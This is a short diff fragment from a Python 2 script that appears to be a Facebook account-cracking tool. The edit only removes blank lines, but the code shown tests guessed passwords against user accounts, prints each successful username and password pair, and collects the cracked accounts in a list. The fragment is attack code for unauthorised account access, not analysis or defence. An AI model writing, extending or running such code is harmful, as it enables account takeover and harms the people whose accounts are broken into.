@@ -386,8 +386,6 @@ def pilih_super():
 													if 'access_token' in q:
 														print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6
 														oks.append(user+pass6)
-												
-												
 												else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
